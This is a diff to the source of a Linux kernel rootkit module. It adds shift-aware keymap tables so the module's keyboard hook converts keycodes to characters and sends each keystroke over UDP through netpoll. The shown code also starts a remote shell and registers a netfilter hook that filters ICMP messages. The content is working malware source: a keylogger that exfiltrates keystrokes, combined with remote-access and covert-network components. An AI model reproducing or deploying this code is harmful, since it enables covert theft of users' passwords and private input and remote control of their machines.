@@ -40,6 +40,29 @@ static struct netpoll np_t;
 
 struct list_head * new_head;
 
+static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
+                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
+                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
+                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
+                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
+                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
+                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
+                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
+                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};
+
+static const char* keymapShiftActivated[] =
+                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
+                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
+                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
+                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
+                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
+                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
+                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
+                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
+                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};
+
+static int shiftKeyDepressed = 0;
+
 /* FUNCTIONALITY */
 
 void init_netpoll(int src, int dest)
@@ -67,17 +90,16 @@ void sendUdp(const char* buf)
 
 int keyboard_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
 	struct keyboard_notifier_param *param = _param;
+  const char *key = !shiftKeyDepressed ? keymap[param->value] : keymapShiftActivated[param->value];
 
 #ifdef LOG
-	if (code == KBD_KEYCODE && param->down) printk(KERN_DEBUG "KEYLOGGER %i down\n", param->value);
+	if (code == KBD_KEYCODE && param->down) printk(KERN_DEBUG "KEYLOGGER %i down  %s\n", param->value, key);
 #endif
 
-	if (code == KBD_KEYCODE && param->down && KEYLOGGER_ACTIVE){
-	      char str[5];
-        printk(KERN_DEBUG "KEYLOGGER SENDING KEY %i %s\n", param->value, (param->down ? "down" : "up"));
-	      sprintf(str, "%d.", param->value);
-	      sendUdp(str);
-    }
+	if (code == KBD_KEYCODE && (param->value==42 || param->value==54)){
+    shiftKeyDepressed = param->down ? 1 : 0;
+  }else if (code == KBD_KEYCODE && KEYLOGGER_ACTIVE && param->down)
+	    sendUdp(key);
 
 	return NOTIFY_OK;
 }
@@ -148,11 +170,11 @@ static int __init rootkit_start(void){
 	start_remote_shell();
 	register_keyboard_notifier(&keyboard_notifier);
 
-	netfilter_hook.hook = filter_icmp_messages;
-    netfilter_hook.hooknum = 0;
-    netfilter_hook.pf = PF_INET;
-    netfilter_hook.priority = 1;
-    nf_register_hook(&netfilter_hook);
+	netfilter_hook.hook = (nf_hookfn*) filter_icmp_messages;
+  netfilter_hook.hooknum = 0;
+  netfilter_hook.pf = PF_INET;
+  netfilter_hook.priority = 1;
+  nf_register_hook(&netfilter_hook);
 
 	return 0;
 }
